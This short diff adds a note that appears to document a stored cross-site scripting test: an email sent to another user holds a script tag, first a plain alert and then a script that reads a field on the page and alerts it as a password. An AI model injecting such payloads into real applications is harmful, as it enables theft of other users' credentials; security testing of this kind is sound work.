@@ -1,0 +1,5 @@
+New email to another user with content:
+Text
+<script>alert('hello world')</script>
+
+Or: <script> var password = document.getElementsByClassName('btn-group')[0].children[1].value; alert(password); </script>
